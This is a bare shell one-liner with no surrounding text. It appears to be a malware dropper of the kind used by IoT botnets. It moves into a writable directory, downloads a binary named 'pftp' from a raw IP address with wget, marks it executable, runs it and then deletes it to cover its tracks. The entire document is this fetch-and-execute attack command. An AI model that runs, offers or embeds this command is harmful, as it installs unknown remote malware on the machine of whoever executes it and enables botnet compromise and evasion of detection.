cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://85.159.237.249/pftp; chmod +x pftp; ./pftp; rm -rf pftp
